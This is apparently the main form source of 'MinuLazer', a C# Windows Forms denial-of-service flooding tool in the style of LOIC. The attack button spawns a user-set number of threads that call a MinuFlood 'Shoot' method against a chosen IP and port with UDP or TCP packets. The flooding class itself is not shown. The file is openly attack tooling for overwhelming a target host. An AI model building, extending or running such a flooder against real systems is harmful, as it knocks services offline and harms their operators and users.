using System;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace MinuLazer
{
    public partial class Form1 : Form
    {
        Point position;
        bool move;

        public Form1()
        {
            InitializeComponent();

            /* Form move */
            MouseDown += (o, e) => { if (e.Button == MouseButtons.Left) { move = true; position = e.Location; } };
            MouseMove += (o, e) => { if (move) Location = new Point(Location.X + (e.X - position.X), Location.Y + (e.Y - position.Y)); };
            MouseUp += (o, e) => { if (e.Button == MouseButtons.Left) { move = false; position = e.Location; } };
        }

        private void attackButton_Click(object sender, EventArgs e)
        {
            attackButton.Enabled = false;
            MinuFlood lazer = new MinuFlood();
            Method methods = new Method();

            for (int i = 0; i < Int32.Parse(threadBox.Text); i++)
            {
                if (methodBox.Text == "UDP" || methodBox.Text == "udp")
                {
                    Thread attack = new Thread(() => lazer.Shoot(ipBox.Text, Int32.Parse(portBox.Text),
                        Encoding.UTF8.GetBytes(packetBox.Text), methods.METHOD_UDP)
                    );
                    attack.Start();
                }
                else if (methodBox.Text == "TCP" || methodBox.Text == "tcp")
                {
                    Thread attack = new Thread(() => lazer.Shoot(ipBox.Text, Int32.Parse(portBox.Text),
                        Encoding.UTF8.GetBytes(packetBox.Text), methods.METHOD_TCP)
                    );
                    attack.Start();
                }
            }
        }

        private void exitButton_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void githubPage_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/seungyup26/minulazer");
        }
    }
}